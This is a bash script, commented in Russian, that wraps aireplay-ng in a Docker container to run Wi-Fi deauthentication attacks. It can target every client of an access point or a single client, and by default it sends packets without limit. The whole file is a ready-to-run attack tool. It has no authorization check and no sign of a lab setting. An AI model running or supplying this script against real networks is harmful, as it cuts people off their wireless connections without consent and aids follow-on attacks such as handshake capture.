#!/bin/bash
#
# deauth.sh - Запуск aireplay-ng для деаутентификации Wi-Fi клиентов
#
# Использование: $0 <interface> <bssid> [options]
# Примеры:
#   $0 wlan0mon AA:BB:CC:DD:EE:FF              # Деаутентификация всех клиентов AP
#   $0 wlan0mon AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA  # Деаутентификация конкретного клиента
#   $0 wlan0mon AA:BB:CC:DD:EE:FF --deauths 10  # Отправить 10 пакетов
#   $0 wlan0mon AA:BB:CC:DD:EE:FF --timeout 30  # Ограничить время атаки 30 секундами
#
# Опции:
#   -c <client_mac>      MAC-адрес клиента (если не указан - broadcast для всех)
#   --deauths <num>      Количество пакетов деаутентификации (0 для бесконечного, по умолчанию 0)
#   --timeout <seconds>  Таймаут для атаки (если deauths=0, по умолчанию нет таймаута)
#
# Логи сохраняются в wifi_data/deauth/<timestamp>-deauth.log

set -euo pipefail

# Проверка минимального количества аргументов
if [ $# -lt 2 ]; then
    echo "Usage: $0 <interface> <bssid> [options]" >&2
    echo "Options:" >&2
    echo "  -c <client_mac>      Client MAC to deauthenticate (broadcast if omitted)" >&2
    echo "  --deauths <num>      Number of deauth packets (0 for unlimited, default: 0)" >&2
    echo "  --timeout <seconds>  Timeout for unlimited attack (optional)" >&2
    exit 1
fi

# Основные параметры
INTERFACE="$1"
BSSID="$2"
shift 2

# Параметры по умолчанию
CLIENT_MAC=""
DEAUTHS="0"
TIMEOUT=""
DOCKER_IMAGE="wifi:latest"
DATA_DIR="wifi_data"
DEAUTH_DIR="$DATA_DIR/deauth"

# Функция для проверки MAC-адреса
validate_mac() {
    local mac="$1"
    if ! [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "ERROR: Invalid MAC address: $mac" >&2
        exit 1
    fi
}

# Парсинг дополнительных аргументов
while [[ $# -gt 0 ]]; do
    case $1 in
        -c)
            CLIENT_MAC="$2"
            validate_mac "$CLIENT_MAC"
            shift 2
            ;;
        --deauths)
            DEAUTHS="$2"
            if ! [[ "$DEAUTHS" =~ ^[0-9]+$ ]]; then
                echo "ERROR: Deauths must be a non-negative integer" >&2
                exit 1
            fi
            shift 2
            ;;
        --timeout)
            TIMEOUT="$2"
            if ! [[ "$TIMEOUT" =~ ^[0-9]+$ ]]; then
                echo "ERROR: Timeout must be a positive integer" >&2
                exit 1
            fi
            shift 2
            ;;
        *)
            echo "ERROR: Unknown option: $1" >&2
            exit 1
            ;;
    esac
done

# Валидация обязательных параметров
validate_mac "$BSSID"

if [ -n "$TIMEOUT" ] && [ "$DEAUTHS" != "0" ]; then
    echo "WARN: Timeout is only applicable when deauths=0 (unlimited mode). Ignoring timeout." >&2
    TIMEOUT=""
fi

# Функция для проверки существования интерфейса (аналогично wifi_recon.sh)
check_interface_exists() {
    docker run --rm --net=host --cap-drop=ALL --cap-add=NET_ADMIN --cap-add=NET_RAW \
        $DOCKER_IMAGE ip link show "$1" >/dev/null 2>&1
    return $?
}

if ! check_interface_exists "$INTERFACE"; then
    echo "ERROR: Interface '$INTERFACE' not found or not accessible" >&2
    exit 1
fi

# Создание директории для логов
mkdir -p "$DEAUTH_DIR"

# Генерация имени лог-файла на основе timestamp
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
LOG_FILE="$DEAUTH_DIR/${TIMESTAMP}-deauth.log"

# Формирование команды aireplay-ng
AIREPLAY_CMD="aireplay-ng -0 $DEAUTHS -a $BSSID"

if [ -n "$CLIENT_MAC" ]; then
    AIREPLAY_CMD="$AIREPLAY_CMD -c $CLIENT_MAC"
fi

AIREPLAY_CMD="$AIREPLAY_CMD $INTERFACE"

echo "Starting deauthentication attack with command:" >&2
echo "  $AIREPLAY_CMD" >&2

# Если указан timeout и deauths=0, оборачиваем в timeout
if [ "$DEAUTHS" = "0" ] && [ -n "$TIMEOUT" ]; then
    AIREPLAY_CMD="timeout --signal=INT ${TIMEOUT}s $AIREPLAY_CMD"
fi

# Запуск aireplay-ng в Docker-контейнере
docker run --rm \
    --name "aireplay-${TIMESTAMP}" \
    --net=host \
    --cap-add=NET_ADMIN \
    --cap-add=NET_RAW \
    --cap-add=SYS_MODULE \
    --cpus="0.5" \
    --memory="1g" \
    -v "$(pwd)/$DATA_DIR/deauth:/$DATA_DIR/deauth" \
    $DOCKER_IMAGE \
    $AIREPLAY_CMD > "$LOG_FILE" 2>&1

# Проверка завершения
EXIT_CODE=$?
if [ $EXIT_CODE -eq 0 ] || [ $EXIT_CODE -eq 124 ]; then  # 124 - timeout
    echo "Deauthentication attack completed" >&2
    echo "Log saved to: $LOG_FILE" >&2
else
    echo "ERROR: aireplay-ng failed with exit code $EXIT_CODE" >&2
    cat "$LOG_FILE" >&2  # Вывод лога для диагностики
    exit 1
fi